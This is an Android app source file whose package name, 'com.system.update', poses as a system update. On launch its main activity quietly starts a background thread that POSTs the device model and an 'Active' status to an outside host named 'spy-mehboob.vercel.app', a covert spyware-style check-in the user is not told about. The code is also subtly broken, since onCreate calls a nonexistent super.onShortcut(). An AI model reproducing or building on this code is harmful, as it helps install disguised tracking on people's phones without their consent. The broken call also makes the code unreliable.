package com.system.update;

import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onShortcut();
        // Background mein data bhejne ka function
        new Thread(() -> {
            try {
                URL url = new URL("https://spy-mehboob.vercel.app/api");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                String jsonData = "{\"model\":\"" + android.os.Build.MODEL + "\", \"status\":\"Active\"}";

                OutputStream os = conn.getOutputStream();
                os.write(jsonData.getBytes());
                os.flush();
                os.close();
                conn.getResponseCode(); 
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }
                  }
